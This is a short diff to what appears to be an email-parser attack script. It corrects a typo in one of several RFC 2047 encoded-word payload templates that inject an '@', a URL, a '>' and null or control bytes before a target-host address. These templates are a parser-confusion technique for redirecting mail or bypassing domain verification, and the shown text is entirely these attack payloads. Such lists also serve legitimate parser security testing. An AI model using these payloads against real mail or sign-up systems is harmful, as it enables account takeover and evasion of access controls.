@@ -20,7 +20,7 @@ define:
 
 run for each:
     payload =
-        "=?iso-8859-1?q?{payload]=40{url}=3e=00?=foo@{target_host}",
+        "=?iso-8859-1?q?{payload}=40{url}=3e=00?=foo@{target_host}",
         "=?iso-8859-1?q?{payload}=40{url}=3e=01?=foo@{target_host}",
         "=?iso-8859-1?q?{payload}=40{url}=3e=02?=foo@{target_host}",
         "=?iso-8859-1?q?{payload}=40{url}=3e=03?=foo@{target_host}",
